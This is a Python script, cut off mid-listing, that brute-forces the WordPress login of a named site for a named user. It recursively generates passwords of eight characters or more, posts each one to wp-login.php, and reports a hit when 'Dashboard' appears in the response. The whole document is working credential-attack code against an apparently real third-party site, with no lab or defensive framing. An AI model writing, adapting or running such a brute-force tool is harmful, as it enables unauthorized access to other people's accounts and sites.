import requests
import os

wordpress_url = 'https://moviefiz.space'
login_endpoint = '/wp-login.php'
username = 'rockyissfree'

session = requests.Session()

def generate(arr, i, s, length):
    response = session.get(wordpress_url + login_endpoint)
    nonce = response.text.split('name="log"')[1].split('value="')[1].split('"')[0]

    if i == 0:
        login_data = {
            'log': username,
            'pwd': s,
            'wp-submit': 'Log In',
            'testcookie': '1',
            'redirect_to': wordpress_url,
            'nonce': nonce
        }
        
        login_response = session.post(wordpress_url + login_endpoint, data=login_data)

        if 'Dashboard' in login_response.text:
            print('Your password is ' + s)
            return
        else:
            print('Login attempt failed: ' + s)
            os.system('clear')
            
        return

    for j in range(0, length):
        appended = s + arr[j]
        generate(arr, i - 1, appended, length)

def crack(arr, length):
    for i in range(8, length + 1):
        generate(arr, i, "", length)

arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R
